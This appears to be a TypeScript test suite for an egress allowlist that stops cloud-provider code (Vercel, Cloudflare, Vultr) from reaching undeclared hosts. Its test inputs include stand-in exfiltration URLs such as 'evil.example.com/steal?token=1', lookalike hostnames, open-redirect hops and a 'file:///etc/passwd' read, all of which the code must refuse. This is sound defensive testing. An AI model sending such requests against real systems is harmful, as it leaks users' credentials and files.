import { afterEach, describe, expect, test, vi } from "vitest";
import { cloudflareRequest } from "../src/core/cloudflare-manager.js";
import {
  createProviderFetch,
  ProviderEgressError,
  type ProviderFetch,
} from "../src/core/providers/egress.js";
import { vercelRequest } from "../src/core/vercel-manager.js";
import { vultrRequest } from "../src/core/vultr-manager.js";

/**
 * Gate item 3 of §11: `api.hosts` stops being prose.
 *
 * The claim under test is narrow and worth stating exactly — **a provider
 * cannot reach a host its manifest does not declare, and a refused request is
 * never sent**. The second half matters as much as the first: a check that
 * blocks the *response* still puts the credential on the wire.
 */

const manifest = { id: "acme", api: { hosts: ["api.acme.test"] } };

/** Records every request that got past the allowlist. */
function spyFetch(response: () => Response = () => new Response("{}")) {
  const calls: { url: string; init?: RequestInit }[] = [];
  const impl: ProviderFetch = async (url, init) => {
    calls.push({ url: String(url), init });
    return response();
  };
  return { calls, impl };
}

function redirect(location: string, status = 302): Response {
  return new Response(null, { status, headers: { location } });
}

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("createProviderFetch", () => {
  test("passes a request to a declared host through", async () => {
    const base = spyFetch();
    const fetch = createProviderFetch(manifest, base.impl);

    const response = await fetch("https://api.acme.test/v1/projects");

    expect(response.status).toBe(200);
    expect(base.calls).toHaveLength(1);
    expect(base.calls[0]?.url).toBe("https://api.acme.test/v1/projects");
  });

  test("refuses an undeclared host without sending anything", async () => {
    const base = spyFetch();
    const fetch = createProviderFetch(manifest, base.impl);

    await expect(fetch("https://evil.example.com/collect")).rejects.toThrow(ProviderEgressError);
    expect(base.calls, "a blocked request must not reach the network").toHaveLength(0);
  });

  test("names the provider and what it was allowed to reach", async () => {
    const fetch = createProviderFetch(manifest, spyFetch().impl);

    await expect(fetch("https://evil.example.com/collect")).rejects.toThrow(
      /Provider "acme" is not allowed to reach evil\.example\.com\. Its manifest declares: api\.acme\.test\./,
    );
  });

  /**
   * A host is matched exactly. `api.acme.test.evil.com` is the attack this
   * rules out — a suffix match would admit it, and the vendor's own
   * customer-controlled subdomains are the reason no wildcard form exists.
   */
  test("matches the host exactly, not by suffix or prefix", async () => {
    const base = spyFetch();
    const fetch = createProviderFetch(manifest, base.impl);

    for (const host of ["api.acme.test.evil.com", "evil-api.acme.test", "acme.test"]) {
      await expect(fetch(`https://${host}/x`)).rejects.toThrow(ProviderEgressError);
    }
    expect(base.calls).toHaveLength(0);
  });

  test("host comparison is case-insensitive", async () => {
    const base = spyFetch();
    const fetch = createProviderFetch(manifest, base.impl);

    await fetch("https://API.ACME.TEST/v1");

    expect(base.calls).toHaveLength(1);
  });

  /**
   * The schemes ruled out are the interesting ones: `file:` reads the disk and
   * `data:` smuggles a payload past a host check entirely — neither has a
   * hostname to compare, so scheme is checked first.
   */
  test.each(["http://api.acme.test/v1", "file:///etc/passwd", "data:text/plain,hello"])(
    "refuses %s",
    async (url) => {
      const base = spyFetch();
      const fetch = createProviderFetch(manifest, base.impl);

      await expect(fetch(url)).rejects.toThrow(ProviderEgressError);
      expect(base.calls).toHaveLength(0);
    },
  );

  /**
   * The one `http:` opening, and the reason it is not a hole: a loopback host
   * is reachable only because `providerApiBase()` accepted an override naming
   * one, and a request that never leaves the loopback interface has no wire to
   * be read off. A stand-in has no certificate, so requiring https would mean
   * requiring one.
   */
  describe("a loopback stand-in", () => {
    const loopback = { id: "acme", api: { hosts: ["127.0.0.1"] } };

    test.each([
      "http://127.0.0.1:8080/v1/projects",
      "https://127.0.0.1:8443/v1/projects",
    ])("passes %s through when the manifest declares it", async (url) => {
      const base = spyFetch();
      const fetch = createProviderFetch(loopback, base.impl);

      await fetch(url);

      expect(base.calls[0]?.url).toBe(url);
    });

    test("is still only reachable when the manifest declares it", async () => {
      const base = spyFetch();
      const fetch = createProviderFetch(manifest, base.impl);

      await expect(fetch("http://127.0.0.1:8080/v1")).rejects.toThrow(ProviderEgressError);
      expect(base.calls).toHaveLength(0);
    });

    test("does not open http for anything that is not loopback", async () => {
      const base = spyFetch();
      const fetch = createProviderFetch(loopback, base.impl);

      // Declared or not, the scheme is checked first — and this host is not
      // loopback however much its name suggests it.
      await expect(fetch("http://127.0.0.1.evil.example/v1")).rejects.toThrow(ProviderEgressError);
      expect(base.calls).toHaveLength(0);
    });
  });

  test("refuses a relative URL rather than resolving it somewhere", async () => {
    const fetch = createProviderFetch(manifest, spyFetch().impl);

    await expect(fetch("/v1/projects")).rejects.toThrow(/is not absolute/);
  });

  describe("redirects", () => {
    /**
     * The hole this closes: an open redirect on an allowlisted host would
     * otherwise carry an `Authorization` header anywhere the vendor points, and
     * `redirect: "follow"` would do it silently inside a single `fetch` call.
     */
    test("refuses a redirect that leaves the allowlist", async () => {
      const responses = [redirect("https://evil.example.com/collect"), new Response("{}")];
      const base = spyFetch(() => responses.shift() ?? new Response("{}"));
      const fetch = createProviderFetch(manifest, base.impl);

      await expect(fetch("https://api.acme.test/v1/redirecting")).rejects.toThrow(
        /not allowed to reach evil\.example\.com/,
      );
      expect(base.calls, "only the first hop is sent").toHaveLength(1);
    });

    test("asks for manual redirects so it can check each hop itself", async () => {
      const base = spyFetch();
      const fetch = createProviderFetch(manifest, base.impl);

      await fetch("https://api.acme.test/v1");

      expect(base.calls[0]?.init?.redirect).toBe("manual");
    });

    test("follows a redirect that stays on an allowlisted host", async () => {
      const responses = [
        redirect("https://api.acme.test/v2/projects"),
        new Response(JSON.stringify({ ok: true })),
      ];
      const base = spyFetch(() => responses.shift() ?? new Response("{}"));
      const fetch = createProviderFetch(manifest, base.impl);

      const response = await fetch("https://api.acme.test/v1/projects");

      expect(await response.json()).toEqual({ ok: true });
      expect(base.calls.map((call) => call.url)).toEqual([
        "https://api.acme.test/v1/projects",
        "https://api.acme.test/v2/projects",
      ]);
    });

    test("resolves a relative Location against the host it came from", async () => {
      const responses = [redirect("/v2/projects"), new Response("{}")];
      const base = spyFetch(() => responses.shift() ?? new Response("{}"));
      const fetch = createProviderFetch(manifest, base.impl);

      await fetch("https://api.acme.test/v1/projects");

      expect(base.calls[1]?.url).toBe("https://api.acme.test/v2/projects");
    });

    /** Per the Fetch standard — and it keeps a body from being replayed. */
    test("a 303 downgrades the follow-up to GET and drops the body", async () => {
      const responses = [redirect("https://api.acme.test/v2/result", 303), new Response("{}")];
      const base = spyFetch(() => responses.shift() ?? new Response("{}"));
      const fetch = createProviderFetch(manifest, base.impl);

      await fetch("https://api.acme.test/v1/jobs", { method: "POST", body: '{"a":1}' });

      expect(base.calls[1]?.init?.method).toBe("GET");
      expect(base.calls[1]?.init?.body).toBeUndefined();
    });

    test("a 308 preserves the method and body", async () => {
      const responses = [redirect("https://api.acme.test/v2/jobs", 308), new Response("{}")];
      const base = spyFetch(() => responses.shift() ?? new Response("{}"));
      const fetch = createProviderFetch(manifest, base.impl);

      await fetch("https://api.acme.test/v1/jobs", { method: "POST", body: '{"a":1}' });

      expect(base.calls[1]?.init?.method).toBe("POST");
      expect(base.calls[1]?.init?.body).toBe('{"a":1}');
    });

    test("gives up on a redirect loop rather than hanging the caller", async () => {
      const base = spyFetch(() => redirect("https://api.acme.test/loop"));
      const fetch = createProviderFetch(manifest, base.impl);

      await expect(fetch("https://api.acme.test/loop")).rejects.toThrow(/redirected more than/);
      expect(base.calls.length).toBeLessThanOrEqual(6);
    });
  });

  test("resolves the global fetch at call time, so a stub still wins", async () => {
    const calls: string[] = [];
    vi.stubGlobal("fetch", async (url: string | URL) => {
      calls.push(String(url));
      return new Response("{}");
    });

    // Built before the stub would have mattered; the point is that the default
    // base is a closure over `fetch`, not a value captured at module load.
    const fetch = createProviderFetch(manifest);
    await fetch("https://api.acme.test/v1");

    expect(calls).toEqual(["https://api.acme.test/v1"]);
  });
});

/**
 * The end of the story, through each manager's real request helper.
 *
 * All three accept an absolute URL and skip their base URL entirely
 * (`path.startsWith("http")`) — an escape that exists for pagination cursors
 * and is exactly what provider code would use to send a token-bearing request
 * anywhere. The allowlist is checked against the final URL, so it does not
 * escape.
 */
describe("a provider cannot reach an unlisted host", () => {
  const cases = [
    {
      name: "vercel",
      hosts: ["api.vercel.com"],
      send: (fetch: ProviderFetch, url: string) =>
        vercelRequest({ token: "t", fetch }, url),
    },
    {
      name: "cloudflare",
      hosts: ["api.cloudflare.com"],
      send: (fetch: ProviderFetch, url: string) =>
        cloudflareRequest({ token: "t", fetch }, url),
    },
    {
      name: "vultr",
      hosts: ["api.vultr.com"],
      send: (fetch: ProviderFetch, url: string) => vultrRequest({ token: "t", fetch }, url),
    },
  ];

  test.each(cases)("$name refuses an absolute URL off its allowlist", async ({ name, hosts, send }) => {
    const reached: string[] = [];
    vi.stubGlobal("fetch", async (url: string | URL) => {
      reached.push(String(url));
      return new Response("{}");
    });
    const fetch = createProviderFetch({ id: name, api: { hosts } }, undefined);

    await expect(send(fetch, "https://evil.example.com/steal?token=1")).rejects.toThrow(
      ProviderEgressError,
    );
    expect(reached, "the credential must never leave the process").toEqual([]);
  });

  test.each(cases)("$name still reaches its own API", async ({ name, hosts, send }) => {
    const reached: string[] = [];
    vi.stubGlobal("fetch", async (url: string | URL) => {
      reached.push(String(url));
      return new Response(JSON.stringify({ success: true, result: {} }));
    });
    const fetch = createProviderFetch({ id: name, api: { hosts } }, undefined);

    await send(fetch, `https://${hosts[0]}/v1/ping`);

    expect(reached).toHaveLength(1);
  });
});
